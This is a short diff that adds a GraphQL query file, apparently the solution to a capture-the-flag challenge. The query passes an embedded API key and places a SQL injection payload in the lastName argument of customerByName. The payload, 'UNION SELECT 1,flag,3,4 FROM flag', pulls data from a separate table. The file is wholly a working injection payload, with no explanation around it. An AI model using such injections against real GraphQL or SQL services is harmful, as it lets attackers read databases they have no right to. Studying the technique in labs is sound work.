@@ -1,0 +1,12 @@
+query {
+  customerByName(
+    apiKey: "0711a879ed751e63330a78a4b195bbad",
+    lastName: "x' UNION SELECT 1,flag,3,4 FROM flag-- -"
+  ) {
+    id
+    firstName
+    lastName
+    address
+  }
+}
+
